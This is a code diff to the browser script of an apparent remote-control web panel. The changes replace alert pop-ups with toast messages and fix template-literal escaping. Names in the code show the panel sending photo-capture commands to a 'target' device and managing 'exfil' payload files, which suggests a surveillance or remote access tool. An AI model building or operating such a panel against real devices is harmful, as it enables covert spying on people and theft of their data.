@@ -593,12 +593,13 @@ app.get('/', (req, res) => {
             .then(r => r.json())
             .then(data => {
                 if (data.success) {
-                    location.reload();
+                    showToast("DEVICE_RENAMED");
+                    setTimeout(() => location.reload(), 1000);
                 } else {
-                    alert('Failed to update name: ' + (data.error || 'Unknown error'));
+                    showToast('Failed to update name: ' + (data.error || 'Unknown error'), "error");
                 }
             })
-            .catch(err => alert('Network error updating device name.'));
+            .catch(err => showToast('Network error updating device name.', "error"));
         }
     }
 
@@ -628,16 +629,16 @@ app.get('/', (req, res) => {
             label = 'Quick Photo (Rear)';
         }
 
-        const fullUrl = \`/proxy\${path}\${path.includes('?') ? '&' : '?'}deviceId=\${encodeURIComponent(deviceId)}\`;
+        const fullUrl = `/proxy${path}${path.includes('?') ? '&' : '?'}deviceId=${encodeURIComponent(deviceId)}`;
         fetch(fullUrl)
             .then(r => {
                 if (r.ok) {
-                    alert(\`[⚡ TACTICAL DISPATCH SUCCESS]\\nCommand "\${label}" dispatched to target.\`);
+                    showToast(`[DISPATCH_SUCCESS] ${label} executed.`);
                 } else {
-                    alert(\`[!] Dispatch status \${r.status}\`);
+                    showToast(`Dispatch failed (Status ${r.status})`, "error");
                 }
             })
-            .catch(err => alert('Network error dispatching quick command.'));
+            .catch(err => showToast("Network error dispatching command", "error"));
     }
 
     function deleteExfil(id) {
@@ -650,12 +651,13 @@ app.get('/', (req, res) => {
             .then(r => r.json())
             .then(data => {
                 if (data.success) {
-                    location.reload();
+                    showToast("PAYLOAD_DELETED");
+                    setTimeout(() => location.reload(), 1000);
                 } else {
-                    alert('Failed to delete file: ' + (data.error || 'Unknown error'));
+                    showToast('Failed to delete file: ' + (data.error || 'Unknown error'), "error");
                 }
             })
-            .catch(err => alert('Network error deleting file.'));
+            .catch(err => showToast('Network error deleting file.', "error"));
         }
     }
     </script>
